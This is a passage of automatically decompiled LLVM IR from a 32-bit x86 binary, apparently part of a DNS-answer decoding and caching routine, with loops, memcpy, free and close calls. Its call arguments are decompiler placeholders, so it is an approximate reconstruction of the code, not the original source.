  %v16_805325c = icmp slt i32 %v5_805325c, 0
  %v2_8053260 = icmp eq i1 %v16_805325c, %v14_805325c
  br i1 %v2_8053260, label %dec_label_pc_8053262, label %dec_label_pc_805324d

dec_label_pc_8053262:                             ; preds = %dec_label_pc_805325c
  store i32 0, i32* @ebx, align 4
  %v1_8053264 = add i32 %v0_8053264, 27
  %v2_8053264 = inttoptr i32 %v1_8053264 to i8*
  store i8 1, i8* %v2_8053264, align 1
  %v0_8053392.pre = load i32, i32* @ebx, align 4
  %v1_8053392.pre = load i32, i32* @esp, align 4
  %v2_805339255 = add i32 %v1_8053392.pre, 104
  %v3_805339256 = inttoptr i32 %v2_805339255 to i32*
  %v4_805339257 = load i32, i32* %v3_805339256, align 4
  %v5_805339258 = sub i32 %v0_8053392.pre, %v4_805339257
  %v11_805339260 = xor i32 %v4_805339257, %v0_8053392.pre
  %v12_805339261 = xor i32 %v5_805339258, %v0_8053392.pre
  %v13_805339262 = and i32 %v12_805339261, %v11_805339260
  %v14_805339263 = icmp slt i32 %v13_805339262, 0
  %v16_805339265 = icmp slt i32 %v5_805339258, 0
  %v2_805339666 = icmp eq i1 %v16_805339265, %v14_805339263
  br i1 %v2_805339666, label %dec_label_pc_80533a2, label %dec_label_pc_8053398.lr.ph

dec_label_pc_8053398.lr.ph:                       ; preds = %dec_label_pc_8053262
  %v0_8053398.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053398

dec_label_pc_805326e:                             ; preds = %dec_label_pc_8053398
  %v1_805326e = add i32 %v0_805326e67, 116
  store i32 %v1_805326e, i32* %eax.global-to-local, align 4
  %v2_8053272 = add i32 %v0_805326e67, -4
  %v3_8053272 = inttoptr i32 %v2_8053272 to i32*
  store i32 %v1_805326e, i32* %v3_8053272, align 4
  %v3_8053273 = load i32, i32* %v3_8053398, align 4
  %v5_8053273 = add i32 %v0_805326e67, -8
  %v6_8053273 = inttoptr i32 %v5_8053273 to i32*
  store i32 %v3_8053273, i32* %v6_8053273, align 4
  %v0_8053277 = load i32, i32* @esi, align 4
  %v2_8053277 = add i32 %v0_805326e67, -12
  %v3_8053277 = inttoptr i32 %v2_8053277 to i32*
  store i32 %v0_8053277, i32* %v3_8053277, align 4
  %v2_8053278 = add i32 %v0_805326e67, -16
  %v3_8053278 = inttoptr i32 %v2_8053278 to i32*
  store i32 %v2_8052e32, i32* %v3_8053278, align 4
  %v0_8053279 = call i32 @__decode_answer()
  store i32 %v0_8053279, i32* @eax, align 4
  %v1_805327e = load i32, i32* @esp, align 4
  %v2_805327e = add i32 %v1_805327e, 68
  %v3_805327e = inttoptr i32 %v2_805327e to i32*
  store i32 %v0_8053279, i32* %v3_805327e, align 4
  %v0_8053282 = load i32, i32* @esp, align 4
  %v1_8053282 = add i32 %v0_8053282, 16
  %v2_8053285 = icmp slt i32 %v0_8053279, 0
  %v1_8053287 = icmp eq i1 %v2_8053285, false
  br i1 %v1_8053287, label %dec_label_pc_80532a1, label %dec_label_pc_8053289

dec_label_pc_8053289:                             ; preds = %dec_label_pc_805326e
  %v0_8053289 = load i32, i32* @ebx, align 4
  %v1_8053289 = icmp eq i32 %v0_8053289, 0
  br i1 %v1_8053289, label %dec_label_pc_8053434, label %dec_label_pc_8053291

dec_label_pc_8053291:                             ; preds = %dec_label_pc_8053289
  %v1_8053291 = add i32 %v0_8053282, 100
  %v2_8053291 = inttoptr i32 %v1_8053291 to i32*
  %v3_8053291 = load i32, i32* %v2_8053291, align 4
  %v4_8053291 = icmp eq i32 %v3_8053291, 0
  br i1 %v4_8053291, label %dec_label_pc_8053434, label %dec_label_pc_80533a2

dec_label_pc_80532a1:                             ; preds = %dec_label_pc_805326e
  %v1_80532a1 = add i32 %v0_8053282, 43
  %v2_80532a1 = inttoptr i32 %v1_80532a1 to i8*
  %v3_80532a1 = load i8, i8* %v2_80532a1, align 1
  %v4_80532a1 = icmp eq i8 %v3_80532a1, 0
  br i1 %v4_80532a1, label %dec_label_pc_8053342, label %dec_label_pc_80532ac

dec_label_pc_80532ac:                             ; preds = %dec_label_pc_80532a1
  %v0_80532ac = load i32, i32* @edi, align 4
  %v1_80532ac = add i32 %v0_80532ac, 28
  %v2_80532ac = inttoptr i32 %v1_80532ac to i32*
  %v3_80532ac = load i32, i32* %v2_80532ac, align 4
  store i32 %v3_80532ac, i32* %eax.global-to-local, align 4
  %v2_80532af = add i32 %v0_8053282, 160
  %v3_80532af = inttoptr i32 %v2_80532af to i32*
  store i32 %v3_80532ac, i32* %v3_80532af, align 4
  %v0_80532b6 = load i32, i32* @edi, align 4
  %v1_80532b6 = add i32 %v0_80532b6, 32
  %v2_80532b6 = inttoptr i32 %v1_80532b6 to i32*
  %v3_80532b6 = load i32, i32* %v2_80532b6, align 4
  store i32 %v3_80532b6, i32* %eax.global-to-local, align 4
  %v1_80532b9 = load i32, i32* @esp, align 4
  %v2_80532b9 = add i32 %v1_80532b9, 148
  %v3_80532b9 = inttoptr i32 %v2_80532b9 to i32*
  store i32 %v3_80532b6, i32* %v3_80532b9, align 4
  %v0_80532c0 = load i32, i32* @edi, align 4
  %v1_80532c0 = add i32 %v0_80532c0, 36
  %v2_80532c0 = inttoptr i32 %v1_80532c0 to i32*
  %v3_80532c0 = load i32, i32* %v2_80532c0, align 4
  store i32 %v3_80532c0, i32* %eax.global-to-local, align 4
  %v1_80532c3 = load i32, i32* @esp, align 4
  %v2_80532c3 = add i32 %v1_80532c3, 152
  %v3_80532c3 = inttoptr i32 %v2_80532c3 to i32*
  store i32 %v3_80532c0, i32* %v3_80532c3, align 4
  %v0_80532ca = load i32, i32* @ecx, align 4
  %v1_80532ca = load i32, i32* @esp, align 4
  %v2_80532ca = add i32 %v1_80532ca, -4
  %v3_80532ca = inttoptr i32 %v2_80532ca to i32*
  store i32 %v0_80532ca, i32* %v3_80532ca, align 4
  %v1_80532cb = add i32 %v1_80532ca, -8
  %v2_80532cb = inttoptr i32 %v1_80532cb to i32*
  store i32 40, i32* %v2_80532cb, align 4
  %v1_80532cd = add i32 %v1_80532ca, 116
  store i32 %v1_80532cd, i32* %edx.global-to-local, align 4
  %v2_80532d1 = add i32 %v1_80532ca, -12
  %v3_80532d1 = inttoptr i32 %v2_80532d1 to i32*
  store i32 %v1_80532cd, i32* %v3_80532d1, align 4
  %v0_80532d2 = load i32, i32* @edi, align 4
  %v2_80532d2 = add i32 %v1_80532ca, -16
  %v3_80532d2 = inttoptr i32 %v2_80532d2 to i32*
  store i32 %v0_80532d2, i32* %v3_80532d2, align 4
  %v4_80532d3 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80532d3, i32* %eax.global-to-local, align 4
  %v0_80532d8 = load i32, i32* @edi, align 4
  %v1_80532d8 = add i32 %v0_80532d8, 4
  %v2_80532d8 = inttoptr i32 %v1_80532d8 to i32*
  %v3_80532d8 = load i32, i32* %v2_80532d8, align 4
  store i32 %v3_80532d8, i32* %eax.global-to-local, align 4
  %v0_80532db = load i32, i32* @esp, align 4
  %v1_80532db = add i32 %v0_80532db, 16
  %v9_80532de = icmp eq i32 %v3_80532d8, 24
  br i1 %v9_80532de, label %dec_label_pc_80532ac.dec_label_pc_8053305_crit_edge, label %dec_label_pc_80532e3

dec_label_pc_80532ac.dec_label_pc_8053305_crit_edge: ; preds = %dec_label_pc_80532ac
  %.pre24 = add i32 %v0_80532db, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8053305.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8053305

dec_label_pc_80532e3:                             ; preds = %dec_label_pc_80532ac
  %v1_80532e3 = add i32 %v0_80532d8, 28
  %v2_80532e3 = inttoptr i32 %v1_80532e3 to i32*
  %v3_80532e3 = load i32, i32* %v2_80532e3, align 4
  %v4_80532e3 = icmp eq i32 %v3_80532e3, 0
  br i1 %v4_80532e3, label %dec_label_pc_80533a2, label %dec_label_pc_80532ed

dec_label_pc_80532ed:                             ; preds = %dec_label_pc_80532e3
  %v1_80532ed = add i32 %v0_80532db, 260
  %v2_80532ed = inttoptr i32 %v1_80532ed to i32*
  %v3_80532ed = load i32, i32* %v2_80532ed, align 4
  %v12_80532ed = icmp eq i32 %v3_80532ed, 1
  br i1 %v12_80532ed, label %dec_label_pc_8053305, label %dec_label_pc_80532f7

dec_label_pc_80532f7:                             ; preds = %dec_label_pc_80532ed
  %v12_80532f7 = icmp eq i32 %v3_80532ed, 28
  %v1_80532ff = icmp eq i1 %v12_80532f7, false
  br i1 %v1_80532ff, label %dec_label_pc_80533a2, label %dec_label_pc_8053305

dec_label_pc_8053305:                             ; preds = %dec_label_pc_80532ac.dec_label_pc_8053305_crit_edge, %dec_label_pc_80532f7, %dec_label_pc_80532ed
  %v4_8053305 = phi i32 [ %v4_8053305.pre, %dec_label_pc_80532ac.dec_label_pc_8053305_crit_edge ], [ %v3_80532ed, %dec_label_pc_80532f7 ], [ %v3_80532ed, %dec_label_pc_80532ed ]
  %v15_8053305 = icmp eq i32 %v3_80532d8, %v4_8053305
  br i1 %v15_8053305, label %dec_label_pc_805331a, label %dec_label_pc_805330e

dec_label_pc_805330e:                             ; preds = %dec_label_pc_8053305
  %v1_8053311 = inttoptr i32 %v0_80532d8 to i32*
  %v2_8053311 = load i32, i32* %v1_8053311, align 4
  %v5_8053311 = inttoptr i32 %v0_80532db to i32*
  store i32 %v2_8053311, i32* %v5_8053311, align 4
  %v1_8053313 = call i32 @free(i32 -1)
  store i32 %v1_8053313, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805338a

dec_label_pc_805331a:                             ; preds = %dec_label_pc_8053305
  %v0_805331a = load i32, i32* @ebx, align 4
  %v1_805331c = sub i32 -1, %v0_805331a
  store i32 %v1_805331c, i32* %eax.global-to-local, align 4
  %v2_805331e = add i32 %v0_80532db, 120
  %v3_805331e = inttoptr i32 %v2_805331e to i32*
  %v4_805331e = load i32, i32* %v3_805331e, align 4
  %v5_805331e = add i32 %v4_805331e, %v1_805331c
  store i32 %v5_805331e, i32* %eax.global-to-local, align 4
  %v2_8053322 = add i32 %v0_80532d8, 36
  %v3_8053322 = inttoptr i32 %v2_8053322 to i32*
  store i32 %v5_805331e, i32* %v3_8053322, align 4
  %v0_8053325 = load i32, i32* @edi, align 4
  %v1_8053325 = add i32 %v0_8053325, 16
  %v2_8053325 = inttoptr i32 %v1_8053325 to i32*
  %v3_8053325 = load i32, i32* %v2_8053325, align 4
  %v1_8053328 = add i32 %v3_8053325, 4
  store i32 %v1_8053328, i32* %eax.global-to-local, align 4
  %v2_805332b = add i32 %v0_8053325, 36
  %v3_805332b = inttoptr i32 %v2_805332b to i32*
  %v4_805332b = load i32, i32* %v3_805332b, align 4
  %v7_805332b = mul i32 %v4_805332b, %v1_8053328
  store i32 %v7_805332b, i32* %eax.global-to-local, align 4
  %v2_805332f = add i32 %v0_8053325, 32
  %v3_805332f = inttoptr i32 %v2_805332f to i32*
  %v4_805332f = load i32, i32* %v3_805332f, align 4
  %v6_8053332 = icmp ugt i32 %v7_805332b, %v4_805332f
  br i1 %v6_8053332, label %dec_label_pc_805331a.dec_label_pc_80533a2.loopexit_crit_edge, label %dec_label_pc_8053334

dec_label_pc_805331a.dec_label_pc_80533a2.loopexit_crit_edge: ; preds = %dec_label_pc_805331a
  %v0_80533a2.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80533a2

dec_label_pc_8053334:                             ; preds = %dec_label_pc_805331a
  store i32 0, i32* %v3_805332b, align 4
  %v0_805333b = load i32, i32* @esp, align 4
  %v1_805333b = add i32 %v0_805333b, 27
  %v2_805333b = inttoptr i32 %v1_805333b to i8*
  store i8 0, i8* %v2_805333b, align 1
  %v1_805338d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805338d

dec_label_pc_8053342:                             ; preds = %dec_label_pc_80532a1
  %v1_8053345 = add i32 %v0_8053282, 132
  %v2_8053345 = inttoptr i32 %v1_8053345 to i32*
  %v3_8053345 = load i32, i32* %v2_8053345, align 4
  %v6_8053345 = inttoptr i32 %v0_8053282 to i32*
  store i32 %v3_8053345, i32* %v6_8053345, align 4
  %v1_805334c = call i32 @free(i32 -1)
  store i32 %v1_805334c, i32* %eax.global-to-local, align 4
  %v0_8053351 = load i32, i32* @esp, align 4
  %v1_8053351 = add i32 %v0_8053351, 16
  %v1_8053354 = add i32 %v0_8053351, 260
  %v2_8053354 = inttoptr i32 %v1_8053354 to i32*
  %v3_8053354 = load i32, i32* %v2_8053354, align 4
  store i32 %v3_8053354, i32* %eax.global-to-local, align 4
  %v1_805335b = add i32 %v0_8053351, 136
  %v2_805335b = inttoptr i32 %v1_805335b to i32*
  %v3_805335b = load i32, i32* %v2_805335b, align 4
  %v15_805335b = icmp eq i32 %v3_805335b, %v3_8053354
  %v1_805335f = icmp eq i1 %v15_805335b, false
  br i1 %v1_805335f, label %dec_label_pc_805338d, label %dec_label_pc_8053361

dec_label_pc_8053361:                             ; preds = %dec_label_pc_8053342
  %v0_8053361 = load i32, i32* @edi, align 4
  %v1_8053361 = add i32 %v0_8053361, 16
  %v2_8053361 = inttoptr i32 %v1_8053361 to i32*
  %v3_8053361 = load i32, i32* %v2_8053361, align 4
  store i32 %v3_8053361, i32* %eax.global-to-local, align 4
  %v2_8053364 = add i32 %v0_8053351, 148
  %v3_8053364 = inttoptr i32 %v2_8053364 to i32*
  %v4_8053364 = load i32, i32* %v3_8053364, align 4
  %v15_8053364 = icmp eq i32 %v3_8053361, %v4_8053364
  %v1_805336b = icmp eq i1 %v15_8053364, false
  br i1 %v1_805336b, label %dec_label_pc_8053427, label %dec_label_pc_8053371

dec_label_pc_8053371:                             ; preds = %dec_label_pc_8053361
  %v0_8053371 = load i32, i32* @edx, align 4
  %v2_8053371 = add i32 %v0_8053351, 12
  %v3_8053371 = inttoptr i32 %v2_8053371 to i32*
  store i32 %v0_8053371, i32* %v3_8053371, align 4
  %v0_8053372 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053372 = add i32 %v0_8053351, 8
  %v3_8053372 = inttoptr i32 %v2_8053372 to i32*
  store i32 %v0_8053372, i32* %v3_8053372, align 4
  %v1_8053373 = add i32 %v0_8053351, 152
  %v2_8053373 = inttoptr i32 %v1_8053373 to i32*
  %v3_8053373 = load i32, i32* %v2_8053373, align 4
  %v5_8053373 = add i32 %v0_8053351, 4
  %v6_8053373 = inttoptr i32 %v5_8053373 to i32*
  store i32 %v3_8053373, i32* %v6_8053373, align 4
  %v0_805337a = load i32, i32* %eax.global-to-local, align 4
  %v1_805337a = load i32, i32* @edi, align 4
  %v2_805337a = add i32 %v1_805337a, 36
  %v3_805337a = inttoptr i32 %v2_805337a to i32*
  %v4_805337a = load i32, i32* %v3_805337a, align 4
  %v7_805337a = mul i32 %v4_805337a, %v0_805337a
  store i32 %v7_805337a, i32* %eax.global-to-local, align 4
  %v2_805337e = add i32 %v1_805337a, 28
  %v3_805337e = inttoptr i32 %v2_805337e to i32*
  %v4_805337e = load i32, i32* %v3_805337e, align 4
  %v5_805337e = add i32 %v4_805337e, %v7_805337a
  store i32 %v5_805337e, i32* %eax.global-to-local, align 4
  %v3_8053381 = inttoptr i32 %v0_8053351 to i32*
  store i32 %v5_805337e, i32* %v3_8053381, align 4
  %v4_8053382 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8052ec0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8053382, i32* %eax.global-to-local, align 4
  %v0_8053387 = load i32, i32* @edi, align 4
  %v1_8053387 = add i32 %v0_8053387, 36
  %v2_8053387 = inttoptr i32 %v1_8053387 to i32*
  %v3_8053387 = load i32, i32* %v2_8053387, align 4
  %v4_8053387 = add i32 %v3_8053387, 1
  store i32 %v4_8053387, i32* %v2_8053387, align 4
  br label %dec_label_pc_805338a

dec_label_pc_805338a:                             ; preds = %dec_label_pc_805330e, %dec_label_pc_8053371
  %v0_805338a = load i32, i32* @esp, align 4
  %v1_805338a = add i32 %v0_805338a, 16
  br label %dec_label_pc_805338d

dec_label_pc_805338d:                             ; preds = %dec_label_pc_8053342, %dec_label_pc_8053334, %dec_label_pc_805338a
  %v1_805338d = phi i32 [ %v1_8053351, %dec_label_pc_8053342 ], [ %v1_805338d.pre, %dec_label_pc_8053334 ], [ %v1_805338a, %dec_label_pc_805338a ]
  %v0_805338d = load i32, i32* @esi, align 4
  %v2_805338d = add i32 %v1_805338d, 52
  %v3_805338d = inttoptr i32 %v2_805338d to i32*
  %v4_805338d = load i32, i32* %v3_805338d, align 4
  %v5_805338d = add i32 %v4_805338d, %v0_805338d
  store i32 %v5_805338d, i32* @esi, align 4
  %v0_8053391 = load i32, i32* @ebx, align 4
  %v1_8053391 = add i32 %v0_8053391, 1
  store i32 %v1_8053391, i32* @ebx, align 4
  %v2_8053392 = add i32 %v1_805338d, 104
  %v3_8053392 = inttoptr i32 %v2_8053392 to i32*
  %v4_8053392 = load i32, i32* %v3_8053392, align 4
  %v5_8053392 = sub i32 %v1_8053391, %v4_8053392
  %v11_8053392 = xor i32 %v4_8053392, %v1_8053391
  %v12_8053392 = xor i32 %v5_8053392, %v1_8053391
  %v13_8053392 = and i32 %v12_8053392, %v11_8053392
  %v14_8053392 = icmp slt i32 %v13_8053392, 0
  %v16_8053392 = icmp slt i32 %v5_8053392, 0
  %v2_8053396 = icmp eq i1 %v16_8053392, %v14_8053392
  br i1 %v2_8053396, label %dec_label_pc_80533a2, label %dec_label_pc_8053398

dec_label_pc_8053398:                             ; preds = %dec_label_pc_8053398.lr.ph, %dec_label_pc_805338d
  %v0_8053398 = phi i32 [ %v0_8053398.pre, %dec_label_pc_8053398.lr.ph ], [ %v5_805338d, %dec_label_pc_805338d ]
  %v0_805326e67 = phi i32 [ %v1_8053392.pre, %dec_label_pc_8053398.lr.ph ], [ %v1_805338d, %dec_label_pc_805338d ]
  %v2_8053398 = add i32 %v0_805326e67, 16
  %v3_8053398 = inttoptr i32 %v2_8053398 to i32*
  %v4_8053398 = load i32, i32* %v3_8053398, align 4
  %v5_8053398 = sub i32 %v0_8053398, %v4_8053398
  %v11_8053398 = xor i32 %v4_8053398, %v0_8053398
  %v12_8053398 = xor i32 %v5_8053398, %v0_8053398
  %v13_8053398 = and i32 %v12_8053398, %v11_8053398
  %v14_8053398 = icmp slt i32 %v13_8053398, 0
  %v16_8053398 = icmp slt i32 %v5_8053398, 0
  %v2_805339c = icmp eq i1 %v16_8053398, %v14_8053398
  br i1 %v2_805339c, label %dec_label_pc_80533a2, label %dec_label_pc_805326e

dec_label_pc_80533a2:                             ; preds = %dec_label_pc_8053291, %dec_label_pc_8053262, %dec_label_pc_805338d, %dec_label_pc_80532e3, %dec_label_pc_80532f7, %dec_label_pc_8053398, %dec_label_pc_805331a.dec_label_pc_80533a2.loopexit_crit_edge
  %v0_80533a2 = phi i32 [ %v0_80533a2.pre.pre, %dec_label_pc_805331a.dec_label_pc_80533a2.loopexit_crit_edge ], [ %v1_8053392.pre, %dec_label_pc_8053262 ], [ %v1_805338d, %dec_label_pc_805338d ], [ %v1_80532db, %dec_label_pc_80532e3 ], [ %v1_80532db, %dec_label_pc_80532f7 ], [ %v0_805326e67, %dec_label_pc_8053398 ], [ %v1_8053282, %dec_label_pc_8053291 ]
  %v1_80533a5 = add i32 %v0_80533a2, 20
  %v2_80533a5 = inttoptr i32 %v1_80533a5 to i32*
  %v3_80533a5 = load i32, i32* %v2_80533a5, align 4
  %v5_80533a5 = add i32 %v0_80533a2, -16
  %v6_80533a5 = inttoptr i32 %v5_80533a5 to i32*
  store i32 %v3_80533a5, i32* %v6_80533a5, align 4
  %v1_80533a9 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80533a9, i32* %eax.global-to-local, align 4
  %v0_80533ae = load i32, i32* @esp, align 4
  %v1_80533b1 = add i32 %v0_80533ae, 272
  %v2_80533b1 = inttoptr i32 %v1_80533b1 to i32*
  %v3_80533b1 = load i32, i32* %v2_80533b1, align 4
  %v4_80533b1 = icmp eq i32 %v3_80533b1, 0
  br i1 %v4_80533b1, label %dec_label_pc_80533c6, label %dec_label_pc_80533bb

dec_label_pc_80533bb:                             ; preds = %dec_label_pc_80533a2
  store i32 %v3_80533b1, i32* %edx.global-to-local, align 4
  %v2_80533c2 = inttoptr i32 %v3_80533b1 to i32*
  store i32 %v2_8052e32, i32* %v2_80533c2, align 4
  %v0_80533d2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80533d2

dec_label_pc_80533c6:                             ; preds = %dec_label_pc_80533a2
  %v3_80533c9 = inttoptr i32 %v0_80533ae to i32*
  store i32 %v2_8052e32, i32* %v3_80533c9, align 4
  %v1_80533ca = call i32 @free(i32 -1)
  store i32 %v1_80533ca, i32* %eax.global-to-local, align 4
  %v0_80533cf = load i32, i32* @esp, align 4
  %v1_80533cf = add i32 %v0_80533cf, 16
  br label %dec_label_pc_80533d2

dec_label_pc_80533d2:                             ; preds = %dec_label_pc_80533bb, %dec_label_pc_80533c6
  %v0_80533d2 = phi i32 [ %v0_80533d2.pre, %dec_label_pc_80533bb ], [ %v1_80533cf, %dec_label_pc_80533c6 ]
  %v1_80533d5 = add i32 %v0_80533d2, 12
  %v2_80533d5 = inttoptr i32 %v1_80533d5 to i32*
  %v3_80533d5 = load i32, i32* %v2_80533d5, align 4
  %v5_80533d5 = add i32 %v0_80533d2, -16
  %v6_80533d5 = inttoptr i32 %v5_80533d5 to i32*
  store i32 %v3_80533d5, i32* %v6_80533d5, align 4
  %v1_80533d9 = call i32 @free(i32 -1)
  store i32 %v1_80533d9, i32* @eax, align 4
  %v0_80533de = load i32, i32* @esp, align 4
  %v1_80533e1 = add i32 %v0_80533de, 8
  %v2_80533e1 = inttoptr i32 %v1_80533e1 to i32*
  store i32 ptrtoint (i8** @global_var_8060948.241 to i32), i32* %v2_80533e1, align 4
  %v1_80533e6 = add i32 %v0_80533de, 4
  %v2_80533e6 = inttoptr i32 %v1_80533e6 to i32*
  store i32 134552291, i32* %v2_80533e6, align 4
  %v1_80533eb = add i32 %v0_80533de, 200
  store i32 %v1_80533eb, i32* %ebx.global-to-local, align 4
  %v3_80533f2 = inttoptr i32 %v0_80533de to i32*
  store i32 %v1_80533eb, i32* %v3_80533f2, align 4
  %v2_80533f3 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052ec0)
  store i32 %v2_80533f3, i32* %eax.global-to-local, align 4
  %v0_80533f8 = load i32, i32* @esp, align 4
  %v1_80533f8 = inttoptr i32 %v0_80533f8 to i32*
  store i32 ptrtoint (i8** @global_var_8060948.241 to i32), i32* %v1_80533f8, align 4
  %v1_80533ff = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80533ff, i32* %eax.global-to-local, align 4
  %v0_8053404 = load i32, i32* @esp, align 4
  %v1_8053404 = add i32 %v0_8053404, 56
  %v2_8053404 = inttoptr i32 %v1_8053404 to i32*
  %v3_8053404 = load i32, i32* %v2_8053404, align 4
  store i32 %v3_8053404, i32* @eax, align 4
  %v1_8053408 = add i32 %v0_8053404, 60
  %v2_8053408 = inttoptr i32 %v1_8053408 to i32*
  %v3_8053408 = load i32, i32* %v2_8053408, align 4
  store i32 %v3_8053408, i32* %edx.global-to-local, align 4
  %v1_805340c = inttoptr i32 %v0_8053404 to i32*
  %v3_805340c = add i32 %v0_8053404, 4
  %v1_805340d = inttoptr i32 %v3_805340c to i32*
  %v1_805340e = sext i32 %v3_8053404 to i64
  store i64 %v1_805340e, i64* @global_var_8060960.242, align 32
  %v1_8053413 = trunc i32 %v3_8053408 to i16
  store i16 %v1_8053413, i16* @global_var_805a6a4.243, align 4
  store i32 1, i32* %v1_805340d, align 4
  %v0_805341c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805341c, i32* %v1_805340c, align 4
  %v2_805341d = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052ec0)
  store i32 %v2_805341d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805355e

dec_label_pc_8053427:                             ; preds = %dec_label_pc_8053361
  %v1_805342a = inttoptr i32 %v0_8053361 to i32*
  %v2_805342a = load i32, i32* %v1_805342a, align 4
  %v5_805342a = inttoptr i32 %v0_8053351 to i32*
  store i32 %v2_805342a, i32* %v5_805342a, align 4
  %v1_805342c = call i32 @free(i32 -1)
  store i32 %v1_805342c, i32* @eax, align 4
  %v0_8053431 = load i32, i32* @esp, align 4
  %v1_8053431 = add i32 %v0_8053431, 16
  br label %dec_label_pc_8053434

dec_label_pc_8053434:                             ; preds = %dec_label_pc_8053166, %dec_label_pc_8053291, %dec_label_pc_8053289, %dec_label_pc_8053225, %dec_label_pc_80531ab, %dec_label_pc_8053187, %dec_label_pc_8053427
  %v1_805343b = phi i32 [ %v1_805317b, %dec_label_pc_8053166 ], [ %v1_8053282, %dec_label_pc_8053291 ], [ %v1_8053282, %dec_label_pc_8053289 ], [ %v1_805319c, %dec_label_pc_8053225 ], [ %v1_805319c, %dec_label_pc_80531ab ], [ %v1_805319c, %dec_label_pc_8053187 ], [ %v1_8053431, %dec_label_pc_8053427 ]
  %v1_8053434 = add i32 %v1_805343b, 51
  %v2_8053434 = inttoptr i32 %v1_8053434 to i8*
  %v3_8053434 = load i8, i8* %v2_8053434, align 1
  %v4_8053434 = icmp eq i8 %v3_8053434, 0
  %v1_8053439 = icmp eq i1 %v4_8053434, false
  br i1 %v1_8053439, label %dec_label_pc_805347f, label %dec_label_pc_805343b

dec_label_pc_805343b:                             ; preds = %dec_label_pc_8053434
  %v0_805343b = load i32, i32* @ecx, align 4
  %v2_805343b = add i32 %v1_805343b, -4
  %v3_805343b = inttoptr i32 %v2_805343b to i32*
  store i32 %v0_805343b, i32* %v3_805343b, align 4
  %v1_805343c = add i32 %v1_805343b, -8
  %v2_805343c = inttoptr i32 %v1_805343c to i32*
  store i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), i32* %v2_805343c, align 4
  %v1_8053441 = add i32 %v1_805343b, -12
  %v2_8053441 = inttoptr i32 %v1_8053441 to i32*
  store i32 134552291, i32* %v2_8053441, align 4
  %v1_8053446 = add i32 %v1_805343b, 184
  store i32 %v1_8053446, i32* @esi, align 4
  %v2_805344d = add i32 %v1_805343b, -16
  %v3_805344d = inttoptr i32 %v2_805344d to i32*
  store i32 %v1_8053446, i32* %v3_805344d, align 4
  %v2_805344e = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052ec0)
  store i32 %v2_805344e, i32* %eax.global-to-local, align 4
  %v0_8053453 = load i32, i32* @esp, align 4
  %v1_8053453 = inttoptr i32 %v0_8053453 to i32*
  store i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), i32* %v1_8053453, align 4
  %v1_805345a = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_805345a, i32* %eax.global-to-local, align 4
  %v0_805345f = load i32, i32* @global_var_8060d98.244, align 8
  store i32 %v0_805345f, i32* %ebx.global-to-local, align 4
  %v0_8053465 = load i32, i32* @esp, align 4
  %v1_8053465 = inttoptr i32 %v0_8053465 to i32*
  %v2_8053465 = load i32, i32* %v1_8053465, align 4
  store i32 %v2_8053465, i32* @eax, align 4
  %v3_8053465 = add i32 %v0_8053465, 4
  %v1_8053466 = inttoptr i32 %v3_8053465 to i32*
  %v2_8053466 = load i32, i32* %v1_8053466, align 4
  store i32 %v2_8053466, i32* %edx.global-to-local, align 4
  %v1_8053467 = add i32 %v0_805345f, -1
  store i32 %v1_8053467, i32* @ebx, align 4
  store i32 1, i32* %v1_8053466, align 4
  %v0_805346a = load i32, i32* @esi, align 4
  store i32 %v0_805346a, i32* %v1_8053465, align 4
  %v2_805346b = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052ec0)
  store i32 %v2_805346b, i32* %eax.global-to-local, align 4
  %v0_8053470 = load i32, i32* @esp, align 4
  %v1_8053470 = add i32 %v0_8053470, 16
  %v1_8053473 = add i32 %v0_8053470, 52
  %v2_8053473 = inttoptr i32 %v1_8053473 to i32*
  %v3_8053473 = load i32, i32* %v2_8053473, align 4
  %v4_8053473 = load i32, i32* @ebx, align 4
  %v5_8053473 = sub i32 %v3_8053473, %v4_8053473
  %v11_8053473 = xor i32 %v4_8053473, %v3_8053473
  %v12_8053473 = xor i32 %v5_8053473, %v3_8053473
  %v13_8053473 = and i32 %v12_8053473, %v11_8053473
  %v14_8053473 = icmp slt i32 %v13_8053473, 0
  %v16_8053473 = icmp slt i32 %v5_8053473, 0
  %v2_8053477 = icmp eq i1 %v16_8053473, %v14_8053473
  br i1 %v2_8053477, label %dec_label_pc_805347f, label %dec_label_pc_8053479

dec_label_pc_8053479:                             ; preds = %dec_label_pc_805343b
  %v4_8053479 = add i32 %v3_8053473, 1
  store i32 %v4_8053479, i32* %v2_8053473, align 4
  br label %dec_label_pc_80534a0.backedge

dec_label_pc_805347f:                             ; preds = %dec_label_pc_8053108, %dec_label_pc_805343b, %dec_label_pc_8053434, %dec_label_pc_805311f
  %v1_805348e = phi i32 [ %v1_8053470, %dec_label_pc_805343b ], [ %v1_805343b, %dec_label_pc_8053434 ], [ %v1_805315b, %dec_label_pc_805311f ], [ %v0_805347f.pre, %dec_label_pc_8053108 ]
  %v1_805347f = add i32 %v1_805348e, 40
  %v2_805347f = inttoptr i32 %v1_805347f to i32*
  %v3_805347f = load i32, i32* %v2_805347f, align 4
  %v1_8053483 = add i32 %v3_805347f, 1
  store i32 %v1_8053483, i32* %eax.global-to-local, align 4
  %v1_8053484 = ashr i32 %v1_8053483, 31
  store i32 %v1_8053484, i32* %edx.global-to-local, align 4
  %v1_8053485 = add i32 %v1_805348e, 248
  %v2_8053485 = inttoptr i32 %v1_8053485 to i32*
